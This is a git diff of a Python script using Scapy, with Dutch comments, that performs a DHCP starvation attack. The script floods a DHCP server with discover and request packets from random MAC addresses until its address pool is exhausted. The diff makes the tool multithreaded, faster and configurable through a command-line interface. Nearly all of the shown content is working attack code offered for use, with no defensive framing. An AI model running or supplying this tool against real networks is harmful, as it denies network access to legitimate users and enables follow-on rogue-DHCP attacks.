@@ -3,6 +3,9 @@ from random import randint
 import threading
 import ipaddress
 import subprocess
+import psutil
+import math
+import argparse
 
 def generate_random_mac():
     # Genereer een random MAC-adres
@@ -27,13 +30,12 @@ def generate_ip_list(interface):
     ip_list = [str(ip) for ip in ip_network]
     return ip_list
 
-def wait_for_dhcp_offer(xid):
+def wait_for_dhcp_offer(xid, dhcp_offer):
     def check_up(packet):
-        global dhcp_offer
         if packet.haslayer(DHCP):
             if packet[DHCP].options[0][1] == 2 and packet[BOOTP].xid == xid:
                 print("DHCP OFFER received")
-                dhcp_offer=packet
+                dhcp_offer.append(packet)
                 return True
             else:
                 return False
@@ -41,19 +43,16 @@ def wait_for_dhcp_offer(xid):
 
 def wait_for_dhcp_ack(xid):
     def check_up(packet):
-        global dhcp_ack
         if packet.haslayer(DHCP):
             print(f"message-type: {packet[DHCP].options}")
             if packet[DHCP].options[0][1] == 5 and packet[BOOTP].xid == xid:
                 print("DHCP ACK received")
-                dhcp_ack=packet
-                dhcp_leases.append((packet[Ether].src,dhcp_offer[BOOTP].yiaddr))
                 return True
             else:
                 return False
     return check_up
 
-def send_dhcp_discover():
+def send_dhcp_discover(dhcp_offer):
     ethernet_layer=Ether(dst='ff:ff:ff:ff:ff:ff',src=generate_random_mac())
     IP_layer=IP(src='0.0.0.0',dst='255.255.255.255')
     UDP_layer=UDP(sport=68,dport=67)
@@ -61,8 +60,8 @@ def send_dhcp_discover():
     DHCP_layer=DHCP(options=[('message-type','discover'),'end'])
     packet=ethernet_layer/IP_layer/UDP_layer/BOOTP_layer/DHCP_layer
 
-    delayed_send(packet, 0.5)
-    sniff(store=0, stop_filter=wait_for_dhcp_offer(BOOTP_layer.xid))
+    delayed_send(packet, 0.2)
+    sniff(store=0,timeout=2, stop_filter=wait_for_dhcp_offer(BOOTP_layer.xid, dhcp_offer))
 
 def send_dhcp_request(mac_address, offered_xid, offered_ip, server_identifier):
     ethernet_layer=Ether(dst='ff:ff:ff:ff:ff:ff',src=mac_address)
@@ -72,17 +71,42 @@ def send_dhcp_request(mac_address, offered_xid, offered_ip, server_identifier):
     DHCP_layer=DHCP(options=[('message-type','request'),('server_id',server_identifier),('requested_addr',offered_ip),'end'])
     packet=ethernet_layer/IP_layer/UDP_layer/BOOTP_layer/DHCP_layer
 
-    delayed_send(packet, 0.5)
+    delayed_send(packet, 0.2)
     sniff(store=0, stop_filter=wait_for_dhcp_ack(offered_xid))
 
-def execute_starve_silly_dhcp_servers(interface):
-        for i in range(1,len(generate_ip_list(interface))):
-            send_dhcp_discover()
-            send_dhcp_request(dhcp_offer[Ether].src, dhcp_offer[BOOTP].xid, dhcp_offer[BOOTP].yiaddr, dhcp_offer[BOOTP].siaddr)
-            
-    
+def get_max_cores():
+    max_thread_count = psutil.cpu_count(logical=True)
+    return max_thread_count
+
+def start_dhcp_conn(interface):
+        threads=[]
+        for i in range(1,math.ceil(len(generate_ip_list(interface))/get_max_cores())):
+            dhcp_offer=[]
+            dhcp_ack=[]
+            send_dhcp_discover(dhcp_offer)
+            if len(dhcp_offer) != 0:
+                send_dhcp_request(dhcp_offer[0][Ether].src, dhcp_offer[0][BOOTP].xid, dhcp_offer[0][BOOTP].yiaddr, dhcp_offer[0][BOOTP].siaddr)
+        for thread in threads:
+            thread.join()
+
+def execute_starve_silly_dhcp_server(interface):
+    max_thread_count = get_max_cores()  # Het maximale aantal beschikbare CPU-cores verkrijgen
+    for i in range(0, max_thread_count):
+        try:
+            thread = threading.Thread(target=start_dhcp_conn, args=(interface,))  # Een nieuwe thread maken voor elke aanval
+            thread.start()  # De thread starten
+            print(f"Thread {i} started (http)")  # Afdrukken dat de thread is gestart
+        except Exception as e:
+            print(f"Error: {e}")
+
+def main():
+    parser = argparse.ArgumentParser(description="Voer een DHCP starvation aanval uit.")
+    parser.add_argument("--interface", required=True, type=str, help="De interface die zich in het netwerk van de DHCP server bevindt")
+
+    args = parser.parse_args()
+
+    interface = args.interface
+    execute_starve_silly_dhcp_server(interface)
+
 if __name__ == "__main__":
-    global dhcp_leases
-    dhcp_leases=[]
-    execute_starve_silly_dhcp_servers("eth0")
-    print(dhcp_leases)
+    main()
